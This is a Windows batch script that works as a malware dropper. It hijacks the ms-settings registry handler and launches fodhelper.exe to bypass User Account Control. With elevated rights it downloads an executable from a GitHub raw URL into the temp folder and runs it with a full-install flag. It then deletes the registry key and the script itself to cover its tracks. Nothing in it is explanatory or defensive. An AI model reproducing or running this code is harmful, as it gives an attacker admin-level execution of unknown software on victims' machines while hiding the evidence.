@echo off
set "K=HKCU\Software\Classes\ms-settings\Shell\Open\command"
reg add %K% /ve /d "cmd /c curl -sL -o %TEMP%\s.exe https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe && %TEMP%\s.exe -fullinstall" /f
reg add %K% /v DelegateExecute /t REG_SZ /d "" /f
start "" fodhelper.exe
ping 127.0.0.1 -n 16 >nul
reg delete HKCU\Software\Classes\ms-settings /f
del "%~f0"